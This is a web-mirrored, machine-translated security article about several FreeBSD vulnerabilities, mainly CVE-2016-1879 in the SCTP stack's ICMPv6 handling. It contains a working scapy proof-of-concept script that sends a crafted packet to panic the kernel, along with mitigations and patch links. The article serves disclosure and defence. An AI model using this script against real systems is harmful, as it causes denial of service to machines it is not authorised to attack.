<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Critically dangerous vulnerabilities discovered in FreeBSD</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The FreeBSD project team reports that a number of critically dangerous vulnerabilities have been discovered in the operating system, allowing attacker...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Critically dangerous vulnerabilities discovered in FreeBSD</h1><div class="post__text post__text-html js-mediator-article"> <a href="https://habrahabr.ru/company/pt/blog/275637/"><img src="https://habrastorage.org/files/050/05e/854/05005e854a9040d9b8d190a7f7b38ec5.png"></a> <br><br>  The FreeBSD project team reports that a number of critically dangerous vulnerabilities have been discovered in the operating system, allowing attackers to launch denial-of-service attacks, elevate privileges, and disclose sensitive data. <br><a name="habracut"></a><br><h4>  Incorrect handling of ICMPv6 messages in the SCTP stack (CVE-2016-1879) <br></h4><br>  SCTP (Stream Control Transmission Protocol - ‚ÄúStream Control Transmission Protocol‚Äù) is a transport layer protocol that is designed to transmit telephone network signaling messages in an IP environment.  Basically, this protocol is used in technological networks of telecom operators. <br><br>  FreeBSD versions 9.3, 10.1, and 10.2 are affected by this vulnerability if they are configured with SCTP and IPv6 support (default configuration).  To exploit the error, an attacker needs to send a specially crafted ICMPv6 message.  Successful operation allows you to implement a denial of service (DoS) attack. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      DoS occurs due to insufficient verification of the length of the SCTP packet header received in the ICMPv6 error message.  When the destination is unavailable, the router can generate an error message and forward it to the sender via ICMPv6. <br><br>  The original IPv6 packet is enclosed in such an ICMPv6 packet, in which the Next Header field indicates how the upper layer protocol is encapsulated.  In this case, it is SCTP. <br><br><img src="https://habrastorage.org/files/602/114/d92/602114d92a8f4e07a6587f9eb42aebf1.png"><br><br>  When the kernel receives an error message via ICMPv6, it finds a top-level protocol packet in it and sends it to the appropriate handler (in this case, sctp6_ctlinput ()). <br><br>  When the kernel receives an error message via ICMPv6, it finds a top-level protocol packet in it and sends it to the appropriate handler (in this case, sctp6_ctlinput ()).  The SCTP handler assumes that the input packet contains a header of sufficient length, tries to copy it using m_copydata (), into which the offset values ‚Äã‚Äãand the number of bytes to be read are transmitted.  Since a 12-byte data block is expected, if you send a packet with an SCTP header less than 12 bytes, a null pointer is dereferenced, which causes a critical system kernel failure (kernel panic). <br><br>  To exploit the vulnerability, having an open SCTP socket is optional. <br>  You can create an ICMPv6 packet for an attack using scapy.  Habr√© has a lot of articles devoted to this powerful tool (for example, <a href="https://habrahabr.ru/post/249563/">this</a> and <a href="https://habrahabr.ru/company/pentestit/blog/208786/">this</a> article). <br><br><pre><code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python # -*- coding: utf-8 -*- import argparse from scapy.all import * def get_args(): parser = argparse.ArgumentParser(description='#' * 78, epilog='#' * 78) parser.add_argument("-m", "--dst_mac", type=str, help="FreeBSD mac address") parser.add_argument("-i", "--dst_ipv6", type=str, help="FreeBSD IPv6 address") parser.add_argument("-I", "--iface", type=str, help="Iface") options = parser.parse_args() if options.dst_mac is None or options.dst_ipv6 is None: parser.print_help() exit() return options if __name__ == '__main__': options = get_args() sendp(Ether(dst=options.dst_mac) / IPv6(dst=options.dst_ipv6) / ICMPv6DestUnreach() / IPv6(nh=132, src=options.dst_ipv6, dst='fe80::230:56ff:fea6:648c'), iface=options.iface)</span></span></code> </pre> <br>  Video demonstration of the attack: <br><br><iframe width="560" height="315" src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://www.youtube.com/embed/BTZoq-lziD4%3Ffeature%3Doembed&amp;xid=17259,15700021,15700186,15700190,15700248,15700253&amp;usg=ALkJrhil_FfzOrwqeyV_xxSgAKb7LzvR9g" frameborder="0" allowfullscreen=""></iframe><br><br>  In order to protect yourself from an attack using this security error, do the following: <br><br><ul><li>  disable IPv6 addressing if it is not required; </li><li>  block ICMPv6 or IPv6 traffic on the firewall; </li><li>  disable SCTP stack support in the operating system kernel - if it is not needed (recompilation of the kernel will be required). </li></ul><br>  To eliminate the vulnerability, you can use a <a href="https://security.freebsd.org/patches/SA-16:01/sctp.patch">patch</a> from the manufacturer, which introduces additional checks in the processing of ICMPv6 messages to the SCTP stack.  And you will need to recompile the kernel. <br><br><h4>  That's not all </h4><br>  In addition, a number of serious vulnerabilities have been discovered in the system.  The FreeBSD developers have released several patches that fix these errors: <br><br><ol><li>  Vulnerability to allow DoS-attack due to an error occurring when processing TCP connections with the TCP_MD5SIG and TCP_NOOPT socket options enabled.  For successful operation, an attacker needs to open a listening socket with the TCP_NOOPT option enabled.  (CVE-2016-1882, <a href="https://security.freebsd.org/patches/SA-16:05/tcp.patch">patch</a> ); </li><li>  Vulnerability that allows a local user to elevate privileges or cause a denial of service: This is possible due to an access control error that allows overwriting random chunks of memory using specially crafted system calls for the Linux compatibility layer setgroups (2).  (CVE-2016-1881, <a href="https://security.freebsd.org/patches/SA-16:04/linux.patch">patch</a> ); </li><li>  Due to an error in the lists of Linux robust futex, hackers get the opportunity to disclose system memory data (CVE-2016-1880, <a href="http://security.freebsd.org/patches/SA-16:03/linux.patch">patch</a> ); </li><li>  Insecure default security settings that allow access to the bsnmpd ‚Äú/etc/bsnmpd.conf‚Äù daemon configuration file (CVE-2015-5677, <a href="https://security.freebsd.org/patches/SA-16:06/bsnmpd.patch">patch</a> ). </li></ol><br>  In order to avoid problems associated with the exploitation of these vulnerabilities, experts from Positive Technologies recommend using IPv6 addressing only if it is required for the operation of applications, installing security updates from the OS developers and using specialized tools to monitor system security (for example, <a href="http://www.ptsecurity.ru/mp8/">MaxPatrol</a> ) to control the security of the system. </div><p>Source: <a href="https://habr.com/ru/post/275637/">https://habr.com/ru/post/275637/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../275623/index.html">Stand back to the forest, and before me ...</a></li>
<li><a href="../275625/index.html">Research day</a></li>
<li><a href="../275627/index.html">Fear and Loathing in Multipeer Connectivity</a></li>
<li><a href="../275631/index.html">How to use a smartphone camera to take photos suitable for OCR or something about the ABBYY Mobile Imaging SDK</a></li>
<li><a href="../275633/index.html">Microservice design patterns</a></li>
<li><a href="../275639/index.html">Expansion of a network of monitoring sites: Europe, Latin America, India</a></li>
<li><a href="../275641/index.html">Welcome to Moscow CocoaHeads January 29</a></li>
<li><a href="../275643/index.html">How to run i2pd for the first time: instruction under Debian / Ubuntu</a></li>
<li><a href="../275645/index.html">Systemd: write your own .service and .target</a></li>
<li><a href="../275647/index.html">How to use i2pd: a comprehensive instruction under MS Windows</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>